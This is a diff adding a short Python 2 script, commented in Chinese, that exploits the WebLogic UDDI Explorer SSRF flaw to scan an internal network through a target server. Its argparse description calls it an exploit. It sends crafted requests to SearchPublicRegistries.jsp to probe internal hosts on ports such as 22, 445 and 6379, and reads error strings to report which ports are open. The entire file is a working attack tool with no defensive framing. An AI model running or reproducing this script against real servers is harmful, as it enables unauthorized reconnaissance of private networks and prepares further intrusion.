@@ -1,0 +1,57 @@
+#!/usr/bin/env python
+# coding: utf-8
+# 功能：扫描内网开放ip及端口
+
+import argparse
+import thread
+import time
+import re
+import requests
+
+
+
+def ite_ip(ip):
+    #for i in range(1, 256):
+    for i in range(139, 146):
+        final_ip = '{ip}.{i}'.format(ip=ip, i=i)
+        thread.start_new_thread(scan, (final_ip,))
+        time.sleep(3)
+
+def scan(final_ip):
+    #ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899', '8080', '7001', '8000')
+    ports = ( '80', '445','22','6379')
+    for port in ports:
+        vul_url = args.url + '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search' % (final_ip, port)
+        try:
+            r = requests.get(vul_url, timeout=15, verify=False) 
+            result0 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
+            result1 = re.findall('route to host', r.content)
+            result2 = re.findall('but could not connect', r.content)
+            if len(result0) != 0 and len(result1) == 0 and len(result2) == 0:
+                out = "port exist: " + final_ip + ':' + port
+                print out        
+        except Exception, e:
+            pass
+
+def get_ip():
+    vul_url = args.url + '/uddiexplorer/SetupUDDIExplorer.jsp'
+    r = requests.get(vul_url, timeout=15, verify=False)
+    reg = re.compile(r"For example: http://\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\ b")
+    result1 = reg.findall(r.content)
+    result = ""
+    if result1:
+        result = result1[0].replace("For example: http://","")
+    return result
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit') 
+    parser.add_argument('--url', dest='url', required=True, help='Target url')
+    parser.add_argument('--ip', dest='scan_ip', help='IP to scan')
+    args = parser.parse_args()
+    ip = '.'.join(args.scan_ip.split('.')[:-1])
+    #print ip
+    #ip = get_ip()
+    if ip:
+        ite_ip(ip)
+    else:
+        print "no ip"
